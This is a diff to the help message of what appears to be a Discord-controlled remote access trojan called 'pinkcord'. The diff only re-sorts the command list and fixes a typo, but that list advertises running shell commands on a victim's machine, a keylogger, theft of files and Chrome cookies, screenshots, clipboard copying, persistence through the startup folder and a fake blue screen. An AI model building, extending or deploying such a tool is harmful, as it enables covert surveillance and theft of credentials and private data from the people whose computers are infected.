@@ -453,33 +453,33 @@ while True:
         @bot.command()
         async def h(ctx):
             wiadomosc = '''
-!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
-!ss [session] - Captures a screenshot from a remote computer.
-!keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
-!steal [session] [file_names] - Steals files from a remote computer.
-!info [session] - Retrieves information about the remote computer system.
+!bsod [session] - display bsod(blue screen of death).
 !cd [session] [path] - Changes the current directory on the remote computer.
-!up [session] - Increases the volume on the remote computer.
-!down [session] - Decreases the volume on the remote computer.
-!message [session] [title] [button] [message] - Displays a message on the remote computer.
-!dir [session] - Displays the current directory on the remote computer.
-!upload [session] [link] [file_name] - Sends a file to the remote computer.
-!click [session] [x] [y] - Clicks at a specific location on the screen.
-!press [session] [key] - Presses a specific key (default: Enter).
-!cli [session] - Copies the clipboard content.
-!write [session] [message] - Types using the keyboard.
-!loc [session] - Displays IP information.
 !cdrom [session] - Opens the CD-ROM drive.
-!sessions - Displays all sessions.
-!rename [session] [new_name] - Changes the name of a session.
-!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
-!shutdown [session] - Shutdown the remote computer.
-!restart [session] - Restart the remote computer.
 !chrome [session] [action(cookie)] - steals selected data from chrome
+!cli [session] - Copies the clipboard content.
+!click [session] [x] [y] - Clicks at a specific location on the screen.
 !delete [session] [path] -  Deletes a file from the remote computer.
-!wallpaper [session] [path] -  changes the wallpaper on the remote computer.
+!dir [session] - Displays the current directory on the remote computer.
+!down [session] - Decreases the volume on the remote computer.
+!info [session] - Retrieves information about the remote computer system.
+!keylogger [session] [action(start, stop, log)] - Starts or stops a keylogger on a remote computer.
 !kill [session] [task] - remote task killing.
-!bsod [session] - display bsod(blue screan of death).
+!loc [session] - Displays IP information.
+!message [session] [title] [button] [message] - Displays a message on the remote computer.
+!press [session] [key] - Presses a specific key (default: Enter).
+!rename [session] [new_name] - Changes the name of a session.
+!restart [session] - Restart the remote computer.
+!shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
+!sessions - Displays all sessions.
+!shutdown [session] - Shutdown the remote computer.
+!ss [session] - Captures a screenshot from a remote computer.
+!startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
+!steal [session] [file_names] - Steals files from a remote computer.
+!up [session] - Increases the volume on the remote computer.
+!upload [session] [link] [file_name] - Sends a file to the remote computer.
+!wallpaper [session] [path] -  changes the wallpaper on the remote computer.
+!write [session] [message] - Types using the keyboard.
             '''
             await ctx.send(wiadomosc)
 
